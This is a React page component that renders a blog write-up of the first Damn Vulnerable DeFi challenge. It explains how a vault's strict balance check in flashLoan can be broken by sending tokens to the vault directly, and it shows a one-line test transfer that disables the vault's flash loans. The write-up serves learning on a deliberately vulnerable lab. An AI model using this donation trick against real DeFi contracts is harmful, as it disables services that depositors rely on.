import Posts from "../Components/Posts";
import CodeSnippet from "../Components/CodeSnippet";

export default function Dvd1() {
  const p = Posts.posts.find(
    (o) => o.id === "id-here"
  );
  return (
    <div>
      <h1 className="mb-6 md:text-5xl/[1.2]">{p.title}</h1>
      <p className="text-fade text-sm">
        {p.date} <span className="inline-block mx-4">|</span> Written by Fatih
        Isik
      </p>
      <p>
        The first Damn Vulnerable DeFi challenge is one of the easiest one.
        There’s a tokenized vault with a million DVT tokens deposited. It’s
        offering flash loans for free, until the grace period ends. And you are
        expected to exploit the lender contract so it won't be able to offer
        flash loans anymore.
      </p>
      <p>Here is the vulnerable part of the code.</p>
      <CodeSnippet
        codeText={`  if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();`}
      />
      <h2 className="mb-6">Solution</h2>
      <p>
        If we send some DVT tokens to lender contract manually not using{" "}
        <span className="code-h">deposit()</span>, there will be an inbalance
        that breaks the condition enforced in the{" "}
        <span className="code-h">flashLoan()</span> function.
      </p>
      <p>In the test file we write our solution:</p>
      <CodeSnippet
        codeText={`  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    await token
      .connect(player)
      .transfer(vault.address, ethers.utils.parseEther("1"));
  });`}
      />
    </div>
  );
}
